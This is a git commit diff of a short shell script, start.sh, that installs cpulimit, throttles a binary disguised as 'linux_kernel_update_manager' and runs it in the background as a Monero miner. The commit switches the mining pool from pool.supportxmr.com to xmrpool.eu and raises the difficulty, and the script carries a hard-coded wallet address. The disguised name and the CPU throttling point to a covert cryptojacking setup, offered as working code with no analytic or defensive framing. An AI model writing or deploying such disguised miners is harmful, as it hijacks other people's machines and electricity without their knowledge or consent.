d65f1bf08db4e38d288dd75ce1a81784c2a35c23
aureliehermanova <41370626+aureliehermanova@users.noreply.github.com>
2018-07-22 01:11:28 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,10 +2,10 @@
 sudo apt-get update &
 sleep 10
 sudo apt install -y cpulimit &&
-chmod +x ~/gg001/linux_kernel_update_manager &&
+chmod +x ~/gg003/linux_kernel_update_manager &&
 cpulimit -e linux_kernel_update_manager -l 50 -b &
 sleep 10
-~/gg001/./linux_kernel_update_manager --any --ssl --forever --variation 3 --low -o pool.supportxmr.com:443 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev+1500 -p google  -c ~/gg001/config.txt &
+~/gg003/./linux_kernel_update_manager --any --ssl --forever --variation 3 --hight -o xmrpool.eu:443 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev.3000 -p google  -c ~/gg001/config.txt &
 sleep 60m
 
 
